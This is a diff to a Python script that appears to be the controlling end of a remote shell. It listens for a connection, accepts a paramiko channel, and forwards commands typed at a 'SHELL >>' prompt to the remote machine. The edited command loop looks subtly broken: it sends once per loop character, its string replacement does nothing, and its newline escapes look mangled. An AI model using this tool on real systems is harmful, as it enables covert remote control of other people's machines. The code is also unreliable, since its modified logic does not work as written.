@@ -30,7 +30,7 @@ try:
 		print ('Listening for connection...')
 		client, addr = sock.accept()
 
-except Exception as e:
+except (Exception, KeyboardInterrupt) as e:
 		print ('Listen/bind/accept failed: ' + str(e))
 		sys.exit(1)
 
@@ -44,10 +44,14 @@ try:
 		chan = t.accept(20)
 		print (chan.recv(1024))
 		while True:
-			command= input("SHELL >> ").strip('n')
-			chan.send(command)
-			print (chan.recv(1024) + b'n')
-except Exception as e:
+			command= input("SHELL >> ")
+			for ch in [' ', 'n', 'cd..']:
+				if ch in command:
+					command = command.replace(ch, ''+ch)
+				chan.send(command)
+				print (chan.recv(1024) + b'n')
+
+except (Exception, KeyboardInterrupt) as e:
 		print ('Caught exception: ' + str(e) + ': ' + str(e))
 		t.close()
 		sys.exit(1)
